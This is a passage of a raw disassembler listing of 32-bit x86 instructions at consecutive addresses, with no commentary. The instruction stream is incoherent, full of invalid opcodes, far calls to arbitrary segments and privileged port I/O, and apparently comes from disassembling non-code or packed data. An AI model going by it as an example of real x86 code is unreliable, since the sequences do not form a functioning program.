  446868:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44686a:	jno    0x4468c0
  44686c:	mov    dl,0x9d
  44686e:	sbb    esi,DWORD PTR [ecx-0x29]
  446871:	rcr    BYTE PTR ds:0xf505ee83,cl
  446877:	retf   0xb25a
  44687a:	mov    edx,0x8460102b
  44687f:	lds    esi,FWORD PTR [edi+0x345bc282]
  446885:	das    
  446886:	pop    edx
  446887:	sbb    eax,0xa7bcd535
  44688c:	sub    ah,BYTE PTR [ecx-0x36ba71e7]
  446892:	xchg   edx,eax
  446893:	add    BYTE PTR [edx+0x167dfcad],dh
  446899:	pop    ss
  44689a:	pop    edi
  44689b:	mov    ds:0x162a04cd,al
  4468a0:	dec    esp
  4468a1:	pusha  
  4468a2:	sbb    dl,BYTE PTR [ebx-0x6c]
  4468a5:	test   DWORD PTR [edx],ecx
  4468a7:	fnsave [ebx-0x5cd28802]
  4468ad:	in     al,0xbe
  4468af:	inc    esp
  4468b0:	xchg   edx,eax
  4468b1:	call   0xac05:0x24e2a715
  4468b8:	sub    BYTE PTR [ebx+0x7db2bf09],bh
  4468be:	adc    DWORD PTR [eax],esp
  4468c0:	sub    DWORD PTR [edx+0x25],edi
  4468c3:	mov    ch,0x9e
  4468c5:	ja     0x4468d9
  4468c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4468c8:	pop    esi
  4468c9:	cld    
  4468ca:	test   BYTE PTR [ecx+0x4],al
  4468cd:	ror    DWORD PTR [ecx-0x2dc42f5c],1
  4468d3:	jnp    0x44692e
  4468d5:	imul   ecx,DWORD PTR [edi],0xffffffcf
  4468d8:	les    ecx,FWORD PTR [ebx]
  4468da:	int3   
  4468db:	inc    esp
  4468dc:	cmp    al,0x74
  4468de:	dec    esp
  4468df:	adc    al,0x85
  4468e1:	pop    edi
  4468e2:	call   0x6eb:0x46abf1d0
  4468e9:	sub    eax,0x1d5ea769
  4468ee:	adc    DWORD PTR [edi-0x24],0x18
  4468f2:	or     cl,dh
  4468f4:	mov    al,0xc1
  4468f6:	retf   0xb5d9
  4468f9:	jns    0x446920
  4468fb:	inc    edi
  4468fc:	fucomi st,st(6)
  4468fe:	mov    dh,0xac
  446900:	sub    eax,0x32d04921
  446905:	push   0xe4a92dbe
  44690a:	test   BYTE PTR [ebp-0x4f589e69],ah
  446910:	cmp    bh,bl
  446912:	call   0x4461:0xe19c02e6
  446919:	or     ecx,DWORD PTR [eax+0x48]
  44691c:	fisttp DWORD PTR [ebp+0x3c]
  44691f:	and    al,0x80
  446921:	test   BYTE PTR ss:[esi+edx*4+0x1e],al
  446926:	push   ebp
  446927:	cmp    dl,cl
  446929:	or     bh,cl
  44692b:	dec    ecx
  44692c:	(bad)  
  44692d:	push   edx
  44692e:	pop    esi
  44692f:	into   
  446930:	adc    eax,0xde610b
  446935:	std    
  446936:	mov    ds:0x9ae2b43a,eax
  44693b:	adc    al,0x43
  44693d:	ss jbe 0x446909
  446940:	or     bl,BYTE PTR [edi-0x55]
  446943:	fstp   TBYTE PTR [edi-0x48c2e7f5]
  446949:	cmp    ebx,DWORD PTR ds:0x9a851ff4
  44694f:	ins    DWORD PTR es:[edi],dx
  446950:	cwde   
  446951:	cmp    dl,BYTE PTR gs:[ecx-0x58337859]
  446958:	sahf   
  446959:	addr16 mov ds:0x14bf,eax
  44695d:	cmp    DWORD PTR [eax-0x44],esp
  446960:	mov    dl,0x6a
  446962:	repnz add al,0xd7
  446965:	mov    bh,0xf3
  446967:	inc    edi
  446968:	fwait
  446969:	or     ebx,DWORD PTR [ebx-0x69]
  44696c:	pop    eax
  44696d:	(bad)  
  44696e:	jmp    0x4469af
  446970:	mov    BYTE PTR [edx-0x7415985f],dh
  446976:	push   esp
  446977:	mov    ah,0xfb
  446979:	push   ecx
  44697a:	int    0x3
  44697c:	out    0xb,al
  44697e:	ficom  DWORD PTR [edi+0x28]
  446981:	sub    ch,dl
  446983:	jmp    0x24dd094e
  446988:	sahf   
  446989:	mov    DWORD PTR [eax+eiz*1-0x59c7795],edi
  446990:	in     al,dx
  446991:	shl    DWORD PTR [eax],0x27
  446994:	sub    ebx,DWORD PTR [edx+0xbbfd7df]
  44699a:	pop    esi
  44699b:	div    cl
  44699d:	int    0x6a
  44699f:	scas   al,BYTE PTR es:[edi]
  4469a0:	arpl   sp,bx
  4469a2:	call   0x137e:0x9f8297a
  4469a9:	inc    edx
  4469aa:	mov    BYTE PTR [edi-0x7349c841],ah
  4469b0:	ins    BYTE PTR es:[edi],dx
  4469b1:	push   cs
  4469b2:	jbe    0x4469e1
  4469b4:	mov    dl,0x6a
  4469b6:	jp     0x446948
  4469b8:	arpl   WORD PTR [edx+0x5b5ae06],bx
  4469be:	fucomi st,st(3)
  4469c0:	cld    
  4469c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4469c2:	sbb    ebp,edx
  4469c4:	dec    eax
  4469c5:	sar    DWORD PTR [ebp+0x3c2b2c46],1
  4469cb:	xchg   ecx,eax
  4469cc:	(bad)  
  4469cd:	cmp    DWORD PTR [eax],edx
  4469cf:	daa    
  4469d0:	push   esp
  4469d1:	xchg   edi,ebx
  4469d3:	(bad)  
  4469d4:	mov    edx,0xe3b08674
  4469d9:	cmp    dl,BYTE PTR [ecx]
  4469db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4469dc:	loop   0x4469fb
  4469de:	push   ds
  4469df:	push   ebp
  4469e0:	leave  
  4469e1:	dec    eax
  4469e2:	call   0x9818:0x3b6f588a
  4469e9:	jno    0x446a16
  4469eb:	mov    ecx,0xe79729d2
  4469f0:	pop    es
  4469f1:	xchg   edx,eax
  4469f2:	shl    BYTE PTR ds:0xbf9a6df2,cl
  4469f8:	xlat   BYTE PTR ds:[ebx]
  4469f9:	and    al,0x96
  4469fb:	scas   eax,DWORD PTR es:[edi]
  4469fc:	ss cmp eax,0x7b2ea790
  446a02:	(bad)  
  446a04:	fucom  st(1)
  446a06:	adc    al,ah
  446a08:	lahf   
  446a09:	ret    0xd3f7
  446a0c:	mov    esp,0xa5f73e0b
  446a11:	push   0xffffff8c
  446a13:	rol    ebx,1
  446a15:	sub    bl,BYTE PTR [edx+0x50dfc208]
  446a1b:	fs mov ebp,gs
  446a1e:	js     0x4469f2
  446a20:	mov    bh,0xb
  446a22:	out    0x10,al
  446a24:	xor    ch,BYTE PTR [eax+eiz*2+0x77]
  446a28:	push   cs
  446a29:	cmp    bl,BYTE PTR [edx+0x77ac55c1]
  446a2f:	fwait
  446a30:	sub    dl,BYTE PTR [ecx+edi*1]
  446a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446a34:	int3   
  446a35:	mov    eax,0xad916921
  446a3a:	pop    esp
  446a3b:	inc    edx
  446a3c:	mov    dl,0xd2
  446a3e:	shl    esi,0xd4
  446a41:	and    BYTE PTR [eax+0x35],bh
  446a44:	mov    bl,0xb
  446a46:	test   eax,0xf9cf839e
  446a4b:	sub    eax,0xf19a6286
  446a50:	xchg   ebp,eax
  446a51:	add    edi,DWORD PTR [eax]
  446a53:	clc    
  446a54:	int3   
  446a55:	mov    edi,0x22dea996
  446a5a:	or     eax,0x262092ee
  446a5f:	jno    0x4469f9
  446a61:	jo     0x4469fd
  446a63:	cmp    ch,BYTE PTR [ebx-0xa]
  446a66:	(bad)  
  446a67:	hlt    
  446a68:	retf   0x111b
  446a6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446a6c:	jecxz  0x446aac
  446a6e:	mov    BYTE PTR [edx-0x2d],dl
  446a71:	adc    DWORD PTR [esi+0x7a],ecx
  446a74:	mov    esi,0xb276bd6b
  446a79:	pop    ss
  446a7a:	aaa    
  446a7b:	jb     0x446a8e
  446a7d:	pop    ebp
  446a7e:	sar    BYTE PTR [eax-0x7e7fa38],0x2c
  446a85:	popf   
  446a86:	mov    edx,0xde5f9086
  446a8b:	sbb    BYTE PTR [edx+0x741d7f7d],dh
  446a91:	mov    bl,0x19
  446a93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  446a94:	mov    ss,WORD PTR [edi]
  446a96:	dec    ebx
  446a97:	lds    ebx,FWORD PTR [edx+ecx*8]
  446a9a:	jmp    0x7253:0x2785df83
  446aa1:	rcr    DWORD PTR [edx+0x8884586],1
  446aa7:	sub    BYTE PTR [ecx+ebx*1+0x6e],dh
  446aab:	inc    ebp
  446aac:	repz or edi,DWORD PTR [ecx]
  446aaf:	dec    ebx
  446ab0:	cs fwait
  446ab2:	and    DWORD PTR ds:0x2f9d7306,edx
  446ab8:	dec    ecx
  446ab9:	arpl   WORD PTR [ebx+0x3b9f72db],cx
  446abf:	ficom  WORD PTR [eax]
  446ac1:	or     ecx,esi
  446ac3:	dec    edx
  446ac4:	adc    al,0xa3
  446ac6:	pushw  0xfffd
  446ac9:	dec    ebx
  446aca:	call   0x3e24:0x213dacc4
  446ad1:	ret    0xa78c
  446ad4:	je     0x446b41
  446ad6:	jg     0x446a85
  446ad8:	mov    bh,0xd3
  446ada:	cdq    
  446adb:	(bad)  
  446adc:	pop    esp
  446add:	xor    ebx,DWORD PTR [edx+0x4c779e5a]
  446ae3:	xchg   edi,eax
  446ae4:	push   es
  446ae5:	test   edi,esi
  446ae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446ae8:	mov    ecx,cs
  446aea:	sbb    DWORD PTR [edx],0x48a800c6
  446af0:	dec    esi
  446af1:	xchg   DWORD PTR [edx-0x6494a12a],ebx
  446af7:	std    
  446af8:	clc    
  446af9:	xchg   edx,eax
  446afa:	fdivr  QWORD PTR [ecx-0x5852fa45]
  446b00:	les    esp,FWORD PTR [ebx+0x57a17195]
  446b06:	push   0xe076b20e
  446b0b:	jmp    0x446aa1
  446b0d:	and    al,0xa1
  446b0f:	mov    al,ds:0x9ede0b9a
  446b14:	pop    ss
  446b15:	sbb    DWORD PTR [edx],0x9ab14b9b
  446b1b:	pop    es
  446b1c:	inc    ebp
  446b1d:	adc    al,ah
  446b1f:	inc    ebx
  446b20:	pop    es
  446b21:	sbb    al,0x6c
  446b23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446b24:	sbb    dh,BYTE PTR [ebx]
  446b26:	(bad)  
  446b27:	xchg   ebp,eax
  446b28:	xchg   edi,eax
  446b29:	push   0x23
  446b2b:	shr    BYTE PTR [esi+eiz*8+0x23b272f9],cl
  446b32:	push   ecx
  446b33:	push   edx
  446b34:	mov    ch,0x3b
  446b36:	mov    BYTE PTR [edi-0xfe17bcd],ah
  446b3c:	scas   al,BYTE PTR es:[edi]
  446b3d:	adc    BYTE PTR [eax+0x3595bd60],bh
  446b43:	pop    eax
  446b44:	retf   0xf5a8
  446b47:	xchg   ecx,eax
  446b48:	loop   0x446afd
  446b4a:	scas   eax,DWORD PTR es:[edi]
  446b4b:	push   eax
  446b4c:	sti    
  446b4d:	add    ah,BYTE PTR [esi-0x3a]
  446b50:	jge    0x446b27
  446b52:	call   0xb2e3:0x480cba7
  446b59:	fistp  WORD PTR [edi+0x5f]
  446b5c:	leave  
  446b5d:	dec    ebx
  446b5e:	pusha  
  446b5f:	push   ecx
  446b60:	cmp    eax,0x31a8a40b
  446b65:	dec    eax
  446b66:	dec    ebp
  446b67:	pop    ds
  446b68:	adc    bl,0x9a
  446b6b:	inc    ecx
  446b6c:	fsub   st(7),st
  446b6e:	mov    ch,0x50
  446b70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446b71:	outs   dx,DWORD PTR ds:[esi]
  446b72:	not    BYTE PTR [edx+0x56]
  446b75:	mov    ds:0x194ca744,al
  446b7a:	mov    dl,0x4
  446b7c:	aad    0x2e
  446b7e:	cmovle esi,DWORD PTR [edx-0x5da2c471]
  446b85:	arpl   WORD PTR [ebx-0x5bf549a1],di
  446b8b:	sahf   
  446b8c:	mov    bh,BYTE PTR [edx]
  446b8e:	dec    ecx
  446b8f:	push   edi
  446b90:	nop
  446b91:	retf   
  446b92:	inc    edi
  446b93:	gs mov dl,0x94
  446b96:	pop    edx
  446b97:	pop    ebp
  446b98:	not    DWORD PTR [eax+eax*4]
  446b9b:	ret    0xb1b
  446b9e:	fcmove st,st(3)
  446ba0:	mov    ecx,0x5a889c7c
  446ba5:	rcr    DWORD PTR [edx+0x4edd8f2b],0x9e
  446bac:	and    DWORD PTR [eax],ecx
  446bae:	xchg   edx,eax
  446baf:	mov    al,ds:0xffeb8023
  446bb4:	cmp    ah,ch
  446bb6:	in     eax,0xc6
  446bb8:	xor    DWORD PTR [esi+0x29],ecx
  446bbb:	outs   dx,DWORD PTR ds:[esi]
  446bbc:	mov    ds:0xee379a95,al
  446bc1:	pop    ds
  446bc2:	jb     0x446b92
  446bc4:	inc    ecx
  446bc5:	mov    ecx,0x36eca798
  446bca:	push   edx
  446bcb:	inc    DWORD PTR [edx-0x4dd7fc86]
  446bd1:	mov    ebp,0x74b4f0e4
  446bd6:	xor    bh,BYTE PTR [edx]
  446bd8:	fnstcw WORD PTR [edx-0x73]
  446bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446bdc:	ja     0x446c41
  446bde:	dec    edi
  446bdf:	push   edx
  446be0:	lds    edx,FWORD PTR [ebx+esi*1+0x51]
  446be4:	mov    gs,ebx
  446be6:	stos   BYTE PTR es:[edi],al
  446be7:	mov    al,0x3f
  446be9:	push   ss
  446bea:	call   0x21ca:0x410f314c
  446bf1:	or     al,0xb
  446bf3:	xchg   ebp,eax
  446bf4:	or     eax,0x62f7a0ee
  446bf9:	pop    eax
  446bfa:	cmc    
  446bfb:	loopne 0x446baf
  446bfd:	cdq    
  446bfe:	icebp  
  446bff:	test   eax,0x44c2153f
  446c04:	mov    esi,0x377c4016
  446c09:	or     eax,DWORD PTR [ecx]
  446c0b:	cmc    
  446c0c:	inc    ecx
  446c0d:	mov    esi,0x29b2f79d
  446c12:	(bad)  
  446c13:	or     eax,0x913be2d7
  446c18:	lahf   
  446c19:	or     esi,edx
  446c1b:	pop    ss
  446c1c:	inc    esi
  446c1d:	cmc    
  446c1e:	cmc    
  446c1f:	dec    edi
  446c20:	inc    esp
  446c21:	int3   
  446c22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446c23:	(bad)  
  446c26:	jmp    0x7235:0xfb098604
  446c2d:	retf   
  446c2e:	arpl   di,sp
  446c30:	cmp    DWORD PTR [ebx],ecx
  446c32:	inc    ebx
  446c33:	test   BYTE PTR [ebp-0xee27383],bh
  446c39:	pop    ds
  446c3a:	test   DWORD PTR [esi+0x6c5a416f],ebx
  446c40:	xor    al,0x88
  446c42:	(bad)  cs:[ebx+ecx*1+0x79]
  446c47:	dec    ebp
  446c48:	dec    esp
  446c49:	ss dec edx
  446c4b:	mov    al,0x2d
  446c4d:	sub    ebx,DWORD PTR [ecx-0x7afffbba]
  446c53:	xor    eax,0x192dcb30
  446c58:	adc    BYTE PTR ds:0x70322df8,dh
  446c5e:	add    esi,eax
  446c60:	out    0xcd,al
  446c62:	int    0x40
  446c64:	mov    ebp,0x98e493bd
  446c69:	or     edx,edi
  446c6b:	clc    
  446c6c:	xchg   ebx,eax
  446c6d:	fmulp  st(0),st
  446c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446c70:	xor    bl,cl
  446c72:	rcr    bh,1
  446c74:	in     eax,0xa2
  446c76:	sbb    bh,BYTE PTR [edx]
  446c78:	jmp    0x858afd81
  446c7d:	jle    0x446c94
  446c7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446c80:	aad    0x2a
  446c82:	dec    esi
  446c83:	push   es
  446c84:	xor    eax,0x7f19850b
  446c89:	aas    
  446c8a:	scas   eax,DWORD PTR es:[edi]
  446c8b:	add    DWORD PTR [ebp-0x499d65bf],ecx
  446c91:	pop    ebp
  446c92:	shl    DWORD PTR [ebx+eiz*4-0x3858a601],cl
  446c99:	cmp    DWORD PTR [ebx-0x1],0x5e372564
  446ca0:	mov    dl,0x79
  446ca2:	mov    edi,0x9ff3c901
  446ca7:	retf   0xc35
  446caa:	fcmovb st,st(6)
  446cac:	pinsrw mm0,WORD PTR [eax-0x658d6775],0xc5
  446cb4:	sbb    eax,0xb14b5933
  446cb9:	gs mov edi,0x410946a7
  446cbf:	jle    0x446d37
  446cc1:	les    esi,FWORD PTR [edx]
  446cc3:	push   cs
  446cc4:	mov    esp,0x39d2f62
  446cc9:	or     ecx,DWORD PTR [esi+esi*1-0x2f]
  446ccd:	imul   ebp,DWORD PTR [edi+0x42282aa7],0xcd30fd04
  446cd7:	mov    ds:0xd4819cb6,eax
  446cdc:	push   ebx
  446cdd:	aad    0x1b
  446cdf:	mov    esi,0xa4ead860
  446ce4:	fisttp QWORD PTR [edx]
  446ce6:	xlat   BYTE PTR ds:[ebx]
  446ce7:	nop
  446ce8:	xor    al,0x50
  446cea:	jo     0x446cd1
  446cec:	and    bl,ch
  446cee:	jmp    0x6c8d:0x885db22d
  446cf5:	ds mov ch,0xcd
  446cf8:	leave  
  446cf9:	or     esp,eax
  446cfb:	add    BYTE PTR [ebx-0x55],0x73
  446cff:	arpl   WORD PTR [edx+0x444ae0b7],bx
  446d05:	dec    edi
  446d06:	call   0xaede:0xc8391ff7
  446d0d:	lahf   
  446d0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446d0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446d10:	out    0xbd,al
  446d12:	and    dl,dl
  446d14:	push   cs
  446d15:	jnp    0x446cf6
  446d17:	lods   eax,DWORD PTR ds:[si]
  446d19:	cmc    
  446d1a:	xchg   esp,eax
  446d1b:	js     0x446d98
  446d1d:	fs push edx
  446d1f:	daa    
  446d20:	inc    ecx
  446d21:	adc    BYTE PTR [edx+ecx*8+0x44],0xc
  446d26:	lods   eax,DWORD PTR ds:[esi]
  446d27:	cmp    BYTE PTR [ecx+0x1787eeef],bl
  446d2d:	pop    es
  446d2e:	adc    BYTE PTR [esi+0x3bb838b2],al
  446d34:	or     eax,0x71f6e86
  446d39:	xor    DWORD PTR [eax+0x76],ebp
  446d3c:	xor    bh,BYTE PTR [ecx-0x24]
  446d3f:	mov    esi,ebx
  446d41:	or     DWORD PTR [eax-0x65a5bb7b],ecx
  446d47:	in     al,dx
  446d48:	out    0x47,al
  446d4a:	mov    al,ds:0x67acf705
  446d4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446d50:	xchg   edx,eax
  446d51:	out    0xf,eax
  446d53:	push   cs
  446d54:	in     al,dx
  446d55:	int    0x52
  446d57:	div    BYTE PTR [edx+0x85d47fa]
  446d5d:	xchg   esp,eax
  446d5e:	test   al,0x2
  446d60:	clc    
  446d61:	daa    
  446d62:	sbb    cl,BYTE PTR [ecx-0x2]
  446d65:	or     eax,DWORD PTR [eax+0x3c861b83]
  446d6b:	fnsave [ebp+0x1fbe55f7]
  446d71:	dec    esi
  446d72:	ins    DWORD PTR es:[edi],dx
  446d73:	dec    edi
  446d74:	sbb    cl,0x13
  446d77:	adc    esp,DWORD PTR [ebx+ecx*1]
  446d7a:	aad    0xff
  446d7c:	jns    0x446dc6
  446d7e:	mov    esp,0x9fb343c4
  446d83:	inc    ebx
  446d84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446d85:	fsub   QWORD PTR [ebp-0x3e]
  446d88:	jb     0x446e08
  446d8a:	call   0x724fd755
  446d8f:	jae    0x446dd1
  446d91:	dec    edx
  446d92:	sub    al,0x37
  446d94:	mov    WORD PTR [esi+eax*4+0x5af3fa02],?
  446d9b:	cs je  0x446d3b
  446d9e:	sub    bh,bl
  446da0:	mov    al,0xc
  446da2:	or     DWORD PTR gs:[edx-0xdc814eb],ebp
  446da9:	mov    al,0x42
  446dab:	loopne 0x446d5f
  446dad:	fistp  WORD PTR [esi]
  446daf:	sbb    BYTE PTR es:0xb634e61,al
  446db6:	ins    DWORD PTR es:[edi],dx
  446db7:	mov    ?,ebx
  446db9:	xchg   ecx,eax
  446dba:	adc    DWORD PTR [esi],edi
  446dbc:	in     eax,dx
  446dbd:	add    al,0x84
  446dbf:	aaa    
  446dc0:	xchg   BYTE PTR [eax+edx*8],ah
  446dc3:	mov    dl,0xea
  446dc5:	les    esp,FWORD PTR [eax+0x3a7b20a9]
  446dcb:	inc    edi
  446dcc:	mov    bl,0x41
  446dce:	sbb    eax,0x20b9bc5
  446dd3:	xchg   ebp,eax
  446dd4:	loope  0x446dad
  446dd6:	or     eax,0x9aa04915
  446ddb:	adc    al,0x5c
  446ddd:	xchg   edx,eax
  446dde:	cdq    
  446ddf:	out    0x20,eax
  446de1:	xor    DWORD PTR [edi+eiz*4],ecx
  446de4:	ret    0xbc19
  446de7:	and    eax,0xd3d95f1a
  446dec:	mov    dl,0x13
  446dee:	sti    
  446def:	stos   BYTE PTR es:[edi],al
  446df0:	clc    
  446df1:	popa   
  446df2:	rcl    DWORD PTR [edx-0x73],1
  446df5:	add    al,0xae
  446df7:	xchg   BYTE PTR ds:0x92ee1a20,dl
  446dfd:	fwait
  446dfe:	jle    0x446dad
  446e00:	mov    dl,0x85
  446e02:	mov    al,0xb8
  446e04:	out    dx,al
  446e05:	call   0x13e411f
  446e0a:	lods   eax,DWORD PTR ds:[esi]
  446e0b:	fisttp WORD PTR [ebx-0x1b]
  446e0e:	sbb    ch,BYTE PTR ds:0x57dc9e44
  446e14:	mov    dl,0xa9
  446e16:	and    ah,BYTE PTR [ecx-0x1e]
  446e19:	mov    edi,0xb9e1009
  446e1e:	push   es
  446e1f:	inc    ecx
  446e20:	inc    edi
  446e21:	(bad)  
  446e23:	fcomp  QWORD PTR [edx+0x3ab09aeb]
  446e29:	out    0xe0,al
  446e2b:	mov    esi,0xb95ac603
  446e30:	scas   al,BYTE PTR es:[edi]
  446e31:	jne    0x446e63
  446e33:	pusha  
  446e34:	mov    edx,0x47170ebf
  446e39:	jae    0x446e10
  446e3b:	sbb    eax,0x878e52b2
  446e40:	sbb    al,dh
  446e42:	shl    BYTE PTR [edi+ebx*2],cl
  446e45:	stc    
  446e46:	jno    0x446def
  446e48:	mov    esi,0x14eeaafd
  446e4d:	adc    eax,0xe9b2dc7e
  446e52:	and    DWORD PTR [ebx-0x27e32943],esp
  446e58:	nop
  446e59:	add    bh,BYTE PTR [edx-0x6614ab9a]
  446e5f:	pushf  
  446e60:	stc    
  446e61:	and    BYTE PTR [edx],ah
  446e63:	or     al,0xbc
  446e65:	sub    al,0xe7
  446e67:	dec    esp
  446e68:	mov    ecx,eax
  446e6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446e6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446e6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446e6d:	inc    ebp
  446e6e:	pop    esi
  446e6f:	add    dh,BYTE PTR [ecx]
  446e71:	stos   BYTE PTR es:[edi],al
  446e72:	pushf  
  446e73:	jmp    DWORD PTR [ebx-0x13cb7b14]
  446e79:	or     eax,DWORD PTR [ebp+0x9]
  446e7c:	cdq    
  446e7d:	jle    0x446e76
  446e7f:	mov    ebp,0xfe9a930a
  446e84:	mov    al,0x84
  446e86:	call   0xb68ada0a
  446e8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446e8c:	shl    esi,0xd9
  446e8f:	mov    edx,0x8c4dc9df
  446e94:	mov    dl,0x39
  446e96:	push   esp
  446e97:	out    dx,al
  446e98:	pop    esi
  446e99:	dec    ebx
  446e9a:	and    eax,0x3872f9ad
  446e9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446ea2:	mov    esi,DWORD PTR [edx-0x16]
  446ea5:	addr16 mov ebx,0xf2ffb234
  446eab:	inc    edx
  446eac:	cli    
  446ead:	in     al,dx
  446eae:	stos   BYTE PTR es:[edi],al
  446eaf:	pop    es
  446eb0:	sub    eax,0x3cc3e30b
  446eb5:	loopne 0x446f15
  446eb7:	mov    edx,DWORD PTR [edi]
  446eb9:	push   edx
  446eba:	call   0x38d9:0x740342c6
  446ec1:	cmp    BYTE PTR [esi+0x1a01219f],0xba
  446ec8:	aam    0xa6
  446eca:	jns    0x446e75
  446ecc:	or     BYTE PTR [eax+ebx*4],0x4d
  446ed0:	or     eax,0x8147e8b0
  446ed5:	mov    eax,DWORD PTR [ebx+0x7c]
  446ed8:	cli    
  446ed9:	pushf  
  446eda:	shl    DWORD PTR [edi-0xcb37d82],1
  446ee0:	out    dx,eax
  446ee1:	push   cs
  446ee2:	inc    esp
  446ee3:	mov    edi,0x3733d1b2
  446ee8:	test   DWORD PTR [esi+0xad98003],ecx
  446eee:	dec    edx
  446eef:	push   0x2d67709f
  446ef4:	es jecxz 0x446eea
  446ef7:	adc    BYTE PTR [edx+0x617f94d2],dh
  446efd:	mov    esi,0xad9d7c3
  446f02:	bound  eax,QWORD PTR [ebp-0x3b]
  446f05:	xchg   ebx,eax
  446f06:	or     BYTE PTR gs:[esi],0x2b
  446f0a:	dec    dh
  446f0c:	mov    ebp,0x16fb7692
  446f11:	sub    eax,DWORD PTR [edx+0x16]
  446f14:	inc    edx
  446f15:	mov    cl,BYTE PTR [edi+eiz*4]
  446f18:	mov    edi,0xb414e278
  446f1d:	call   0x5ad8ddec
  446f22:	ds xchg ecx,eax
  446f24:	mov    ch,0xb7
  446f26:	mov    ch,cl
  446f28:	lods   eax,DWORD PTR ds:[esi]
  446f29:	jmp    0x446fa1
  446f2b:	or     bh,BYTE PTR [ecx+0x41]
  446f2e:	or     eax,0xf95187a7
  446f33:	(bad)  
  446f34:	pushf  
  446f35:	dec    esp
  446f36:	fsub   QWORD PTR [eax-0x5626ed4e]
  446f3c:	aam    0x11
  446f3e:	xchg   edx,eax
  446f3f:	in     al,dx
  446f40:	lea    ecx,[ebx]
  446f42:	or     al,0x84
  446f44:	iret   
  446f45:	das    
  446f46:	mov    edx,0x9a388381
  446f4b:	in     eax,0x19
  446f4d:	sbb    esp,eax
  446f4f:	mov    al,0x5d
  446f51:	adc    al,BYTE PTR [esi]
  446f53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446f54:	loop   0x446fa4
  446f56:	fimul  DWORD PTR [esp+edx*8-0x4c27d0f4]
  446f5d:	and    ebp,ebx
  446f5f:	cmovnp ebx,DWORD PTR [edx+0x5f4e50a5]
  446f66:	lds    ebx,FWORD PTR [edx+0x101ab6f9]
  446f6c:	sbb    al,0x51
  446f6e:	jge    0x446fd8
  446f70:	pop    ss
  446f71:	js     0x446f0d
  446f73:	push   ss
  446f74:	in     eax,0xf2
  446f76:	mov    BYTE PTR [edx+0x24],ch
  446f79:	or     dh,BYTE PTR [ebx-0x58]
  446f7c:	test   DWORD PTR [ebp-0x38],eax
  446f7f:	das    
  446f80:	rol    BYTE PTR [eax-0xf],cl
  446f83:	dec    ecx
  446f84:	inc    edx
  446f85:	mov    dh,0xe2
  446f87:	sti    
  446f88:	mov    dl,0x10
  446f8a:	cmp    bl,BYTE PTR [esi+0x98f1ce6]
  446f90:	fwait
  446f91:	or     ecx,DWORD PTR [edx+0x1e34d171]
  446f97:	call   0x56df5da0
  446f9c:	dec    BYTE PTR [edx+ecx*8+0x29]
  446fa0:	mov    esi,0x991f0360
  446fa5:	or     cl,BYTE PTR [eax+0x6f2ac4c]
  446fab:	sahf   
  446fac:	shr    DWORD PTR [ebx],0xdf
  446faf:	sbb    BYTE PTR [ebx-0x37492cd7],bh
  446fb5:	or     esi,DWORD PTR [edi+0x67fd3726]
  446fbb:	pop    ss
  446fbc:	or     al,0xb
  446fbe:	push   ds
  446fbf:	outs   dx,DWORD PTR ds:[esi]
  446fc0:	pop    ecx
  446fc1:	jbe    0x447038
  446fc3:	xor    al,0x4e
  446fc5:	lahf   
  446fc6:	call   0x9895:0xc55649f7
  446fcd:	cmp    BYTE PTR [esi+ebx*8+0x79],al
  446fd1:	or     eax,DWORD PTR [ecx]
  446fd3:	pop    ds
  446fd4:	mov    bh,0xf5
  446fd6:	cmp    eax,0x7c4c00dd
  446fdb:	mov    ecx,0xb8d413b7
  446fe0:	ins    BYTE PTR es:[edi],dx
  446fe1:	cli    
  446fe2:	sbb    BYTE PTR [edi+0x735afe23],ch
  446fe8:	cmp    ecx,edi
  446fea:	test   BYTE PTR [edi],ah
  446fec:	cmp    al,0xea
  446fee:	mov    ds:0x8d990fa7,al
  446ff3:	(bad)  
  446ff4:	neg    DWORD PTR ds:0x10b4a7d8
  446ffa:	xchg   edi,eax
  446ffb:	jnp    0x446fdd
  446ffd:	push   0xffffffdc
  446fff:	and    eax,0xb72818b2
  447004:	std    
  447005:	mov    ?,esp
  447007:	into   
  447008:	add    ecx,DWORD PTR [ebx]
  44700a:	pop    ebp
  44700b:	in     eax,0x76
  44700d:	mov    eax,0x9de9a6f6
  447012:	call   0x3c76:0x26c84352
  447019:	call   0x51a:0x6f1ea4cb
  447020:	push   esi
  447021:	js     0x447065
  447023:	lea    edx,[edx-0x706310eb]
  447029:	inc    edi
  44702a:	nop
  44702b:	daa    
  44702c:	addr16 cmp eax,0xae96dca8
  447032:	ins    BYTE PTR es:[edi],dx
  447033:	dec    ebx
  447034:	push   0xb
  447036:	sbb    dl,BYTE PTR [esi]
  447038:	xchg   ebp,eax
  447039:	mov    ecx,0x3c614c9e
  44703e:	and    dl,BYTE PTR [esi+0x48]
  447041:	push   ds
  447042:	call   0x23b5:0x193e92c8
  447049:	cmp    ebx,DWORD PTR [ecx-0x5c2f8359]
  44704f:	jmp    0xb7d28c71
  447054:	mov    dl,0x98
